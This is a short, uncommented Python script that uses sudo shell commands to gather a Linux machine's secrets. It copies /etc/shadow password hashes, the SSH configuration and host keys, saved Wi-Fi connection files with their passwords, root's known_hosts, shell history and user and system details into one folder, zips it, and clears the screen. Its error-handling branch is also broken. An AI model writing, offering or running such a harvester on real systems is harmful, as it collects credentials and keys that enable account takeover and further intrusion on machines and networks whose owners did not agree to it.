import os
import time

def osdetails():
    os.system("neofetch > neosysinfo.txt")
    os.system("w > w.txt")
    os.system("history > c_his.txt")
    os.system("users > users.txt")
    os.system("sudo cat /root/.ssh/known_hosts > known_hosts.txt")
    os.system("sudo cat /etc/bash.bashrc > bash.txt")
    os.system("ls /etc/NetworkManager/system-connections > wifi_clients.txt")
    os.mkdir("wifi_clients")
    os.system("sudo cp /etc/NetworkManager/system-connections/* wifi_clients")
    os.system("uname -a > uname.txt")
    os.mkdir("ssh")
    os.system("sudo cp /etc/ssh/* ssh/")
    os.system("sudo cat /etc/shadow > shadow.txt")
    os.system("sudo cat /etc/hosts > hosts.txt")
    os.system("ls /root/ > root_dir.txt")
    os.system("clear")


try:
    os.mkdir("Details")
    os.chdir("Details")
    os.mkdir("OS_Details")
    os.chdir("OS_Details")
    osdetails()
    os.chdir("..")
except Exception as error:
    print("\n\tError Encountered !!!\n", error, "\n")
    os.chdir("OS_Details")
    os.mkdir("Errors")
    os.chdir("Errors")
    with open("errors.txt", "w") as f:
        f.write(error)
    os.chdir("..")
finally:
    os.system("zip -r details.zip *")
    os.system("clear")
    print()
    print(" \tCode Executed Successfully...", "\tExiting Program...")
print()
